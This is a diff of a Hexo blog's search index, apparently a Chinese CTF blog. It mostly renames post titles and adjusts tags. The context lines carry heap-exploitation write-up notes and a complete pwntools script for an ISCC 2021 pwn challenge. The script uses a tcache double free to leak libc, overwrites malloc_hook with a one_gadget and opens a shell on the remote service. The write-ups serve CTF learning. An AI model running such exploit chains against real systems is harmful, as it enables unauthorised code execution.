@@ -260,7 +260,6 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
-        <category>HGame</category>
       </categories>
   </entry>
   <entry>
@@ -665,7 +664,7 @@
       </categories>
   </entry>
   <entry>
-    <title>Pwn_BUUCTF</title>
+    <title>BUUCTF</title>
     <url>/2021/04/13/BUUCTF/</url>
     <content><![CDATA[<p>记录一些奇奇怪怪的题目 or 搞不懂的操作</p>
 <span id="more"></span>
@@ -717,7 +716,9 @@
   <entry>
     <title>BUU_Heap</title>
     <url>/2021/04/13/BUU_Heap/</url>
-    <content><![CDATA[<p>开启了”Full RELRO”，我们只能改写 <code>free_hook</code>成<code>one_gadget</code></p>
+    <content><![CDATA[<span id="more"></span>
+
+<p>开启了”Full RELRO”，我们只能改写 <code>free_hook</code>成<code>one_gadget</code></p>
 <h1 id="heap-babyheap-0ctf-2017"><a href="#heap-babyheap-0ctf-2017" class="headerlink" title="heap babyheap_0ctf_2017"></a>heap babyheap_0ctf_2017</h1><h1 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="BUU_Heap/image-20210413141119979.png" alt="image-20210413141119979"></p>
 <p>地址随机化没有打开，Partial RELRO 那说明got表可写，可以通过改写got表为想要的函数</p>
 <h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>三个主要的函数，create，edit，delete</p>
@@ -1025,9 +1026,11 @@
       </categories>
   </entry>
   <entry>
-    <title>Heap_Learn</title>
+    <title>C语言中常见漏洞点</title>
     <url>/2021/05/11/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%82%B9/</url>
-    <content><![CDATA[<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
 <p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
 <h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
 ]]></content>
@@ -1064,7 +1067,9 @@
   <entry>
     <title>Heap_Learn</title>
     <url>/2021/04/05/Heap_Learn/</url>
-    <content><![CDATA[<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>
 
 <p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p>
 <p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
@@ -1102,9 +1107,11 @@
       </categories>
   </entry>
   <entry>
-    <title></title>
+    <title>ISCC_2021</title>
     <url>/2021/05/26/ISCC_2021/</url>
-    <content><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
 <p><img src="ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p>
 <p>ida</p>
 <p>给了 system(“/bin/sh”)</p>
@@ -1138,6 +1145,9 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
   </entry>
   <entry>
     <title></title>
